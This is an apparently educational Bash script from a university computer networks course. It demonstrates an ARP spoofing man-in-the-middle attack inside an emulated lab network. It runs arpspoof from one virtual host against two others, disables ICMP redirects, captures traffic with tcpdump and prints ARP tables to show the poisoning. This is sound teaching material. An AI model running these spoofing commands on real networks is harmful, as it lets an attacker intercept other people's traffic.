#!/bin/bash

echo "------------------------------------"
echo "~   Corso di Reti di Calcolatori   ~"
echo "~ Universita degli Studi di Milano ~"
echo "------------------------------------"

echo "Autore: Patrizio Tufarolo <patrizio@tufarolo.eu>"
echo


# MIT License
#  
# Copyright (c) 2018 Patrizio Tufarolo
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
##

Color_Off='\e[0m'
bldgrn='\e[1;32m'

ok_colorato_per_log() {
        RED=$(tput setaf 1)
        GREEN=$(tput setaf 2)
        NORMAL=$(tput sgr0)
        LENMSG="$1"
        let COL=$(tput cols)-${LENMSG}
        printf "%${COL}s%s%s%s%s%s" "$NORMAL" "[" "$GREEN" "OK" "$NORMAL" "]"
}
do_cmd() {
        local cmd;
        local msg;
        cmd="$1"
        msg="$2"
        echo
        echo -e ${bldgrn}"${cmd}"${Color_Off}
        eval "$cmd" 2>/dev/null
        echo
        echo -n "$msg"
        ok_colorato_per_log ${#msg}
        read -rsp $'\nPremere invio per continuare...\n'
}
do_cmd_pid() {
        local cmd;
        local msg;
        local pid;
        local __resultvar=$3;
        cmd="$1"
        msg="$2"

        echo
        echo -e $bldgrn $cmd $Color_Off;
        eval "$cmd & "
        pid=$!
        echo -n "$msg"
        ok_colorato_per_log ${#msg}
        read -rsp $'\nPremere invio per continuare...\n'
        eval $__resultvar=$pid;
}

sudo -i exit



EXPERIMENT="$(sudo himage -e pc1)"

do_cmd_pid "xterm -e 'sudo himage pc3 arpspoof -i eth0 -t 10.0.0.20 10.0.0.21'"				"=> Avvio arpspoofing con target 10.0.0.20 su PC3" pid1
do_cmd_pid "xterm -e 'sudo himage pc3 arpspoof -i eth0 -t 10.0.0.21 10.0.0.20'"				"=> Avvio arpspoofing con target 10.0.0.21 su PC3" pid2 
do_cmd_pid "xterm -e 'sudo himage pc3 tcpdump -i eth0 icmp'"						"=> Avvio arpspoofing tcpdump su PC3" pid3
do_cmd "sudo himage pc3 sysctl net.ipv4.conf.eth0.send_redirects=0"					"=> Disabilita ICMP redirect su PC3"
do_cmd "sudo himage pc1 ping -c 5 10.0.0.21"								"=> Lancio un ping da PC1 a PC2"
do_cmd "sudo himage pc1 ip neigh"									"=> Stampo la tabella ARP PC1"
do_cmd "sudo himage pc2 ip neigh"									"=> Stampo la tabella ARP PC2"
read -rsp $'\nPremere invio nuovamente per chiudere XTERM...\n'

if kill -0 $pid1; then 
sudo kill -9 $pid1 1>/dev/null 2>/dev/null;
fi

if kill -0 $pid2; then
sudo kill -9 $pid2 1>/dev/null 2>/dev/null;
fi

if kill -0 $pid3; then
sudo kill -9 $pid3 1>/dev/null 2>/dev/null;
fi
